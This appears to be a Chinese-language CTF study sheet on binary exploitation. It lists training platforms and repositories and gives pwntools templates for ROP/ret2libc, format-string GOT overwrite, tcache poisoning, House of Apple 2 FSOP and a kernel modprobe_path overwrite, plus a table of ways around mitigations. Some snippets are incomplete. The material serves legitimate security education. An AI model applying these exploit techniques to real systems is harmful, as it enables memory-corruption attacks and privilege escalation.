# 二进制利用案例与资源

## 学习平台

| 平台 | 链接 | 内容 |
|------|------|------|
| Pwn.College | https://pwn.college | 结构化二进制利用课程 |
| ROP Emporium | https://ropemporium.com | ROP 链练习 |
| Exploit Education | https://exploit.education | 利用练习 VM |
| Microcorruption | https://microcorruption.com | 嵌入式安全 CTF |
| How2Heap | https://github.com/shellphish/how2heap | 堆利用教程 |

## GitHub 仓库

### Naetw/CTF-pwn-tips (1.8k stars)
- 链接: https://github.com/Naetw/CTF-pwn-tips
- 内容: 实用 pwn 技巧
- 技术: 缓冲区溢出、one-gadget、hook 劫持、TLS 利用、RNG 利用

### Crypto-Cat/CTF (2.5k stars)
- 链接: https://github.com/Crypto-Cat/CTF
- 内容: CTF writeup + 视频讲解
- 技术: HackTheBox、pwn、web、游戏 hacking

### shellphish/how2heap
- 链接: https://github.com/shellphish/how2heap
- 内容: 堆利用教育工具
- 技术: fastbin_dup、unsafe_unlink、house_of_spirit、overlapping_chunks

## 典型案例

### 案例 1: 栈溢出 + ROP
**场景**: gets() 栈溢出，无 canary，NX 开启
**方法**:
```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# 找偏移
payload = cyclic(200)
p.sendline(payload)
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))

# ROP chain
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('vuln')  # 返回到 vuln 再次溢出

payload = flat(
    b'A' * offset,
    rop.chain()
)
p.sendline(payload)

# 泄露 libc
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']

# 第二次溢出 getshell
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])
payload2 = flat(b'A' * offset, rop2.chain())
p.sendline(payload2)
p.interactive()
```

### 案例 2: 格式字符串泄露 + 写入
**场景**: printf(user_input)，可以泄露栈和写入任意地址
**方法**:
```python
from pwn import *

# 泄露栈地址
p.sendline(b'%p.' * 20)
leaks = p.recv().split(b'.')
canary = int(leaks[7], 16)

# 写入 GOT
payload = fmtstr_payload(5, {elf.got['printf']: elf.symbols['system']})
p.sendline(payload)
```

### 案例 3: tcache poisoning
**场景**: glibc 2.27+，UAF 或 double free
**方法**:
```python
from pwn import *

# 分配两个相同大小的 chunk
malloc(0x20)  # chunk A
malloc(0x20)  # chunk B

# 释放到 tcache
free(0)  # A -> tcache[0x30]
free(1)  # B -> A -> tcache[0x30]

# UAF 修改 tcache fd
edit(0, p64(target_addr))  # A -> target_addr

# 分配取回 A
malloc(0x20)  # 取出 A
malloc(0x20)  # 取出 target_addr
```

### 案例 4: House of Apple 2 (FSOP)
**场景**: glibc 2.35+，无 __malloc_hook/__free_hook
**方法**:
```python
# 伪造 _IO_FILE 结构
# 1. 分配 unsorted bin chunk
# 2. 覆写 _IO_list_all 指向 fake FILE
# 3. 触发 malloc -> _IO_flush_all_lockp -> system

fake_IO = FileStructure()
fake_IO._flags = 0x6873  # "sh\x00"
fake_IO._IO_write_base = 0
fake_IO._IO_write_ptr = 1
fake_IO._IO_read_end = system_addr
```

### 案例 5: 内核利用 (modprobe_path)
**场景**: 内核堆溢出，可以覆写 modprobe_path
**方法**:
```python
# 1. 找到 modprobe_path 地址
# 2. 覆写为恶意脚本路径
# 3. 触发未知文件格式执行

# 用户态
#!/bin/sh
cp /flag /tmp/flag
chmod 777 /tmp/flag

# 内核态覆写
write_to_kernel(modprobe_path, b'/tmp/evil.sh\x00')

# 触发
open('/tmp/trigger', O_RDONLY)  # 未知格式
```

## 保护绕过速查

| 保护 | 绕过方法 |
|------|---------|
| NX (栈不可执行) | ROP / ret2libc |
| Canary | 泄露 / 暴力破解 / 格式字符串 |
| PIE | 泄露基址 |
| Full RELRO | 覆写 __free_hook / vtable |
| ASLR | 泄露 libc 基址 |
| seccomp | openat + read + write (orw) |
| KASLR | 内核信息泄露 |
| SMEP/SMAP | ROP 切换 CR4 |
